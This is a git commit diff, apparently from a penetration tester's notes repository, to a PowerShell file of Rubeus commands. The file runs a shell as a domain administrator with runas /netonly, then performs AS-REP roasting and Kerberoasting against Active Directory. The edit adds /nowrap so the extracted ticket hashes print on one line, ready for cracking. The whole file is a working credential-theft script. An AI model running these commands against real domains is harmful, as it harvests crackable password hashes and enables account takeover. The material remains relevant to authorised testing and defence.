ca306762cf7725fe72c43b31d7bec0ebcf59d549
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-09-05 12:59:31 +0100

    Update rubeus.ps1

--- windows/credentials/rubeus/rubeus.ps1
+++ windows/credentials/rubeus/rubeus.ps1
@@ -1,4 +1,4 @@
 runas /netonly /user:mydomain\administrator powershell
-C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe asreproast
-C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe kerberoasting
+C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /nowrap
+C:\tools\rubeus\Rubeus\bin\Release\Rubeus.exe kerberoasting /nowrap
 
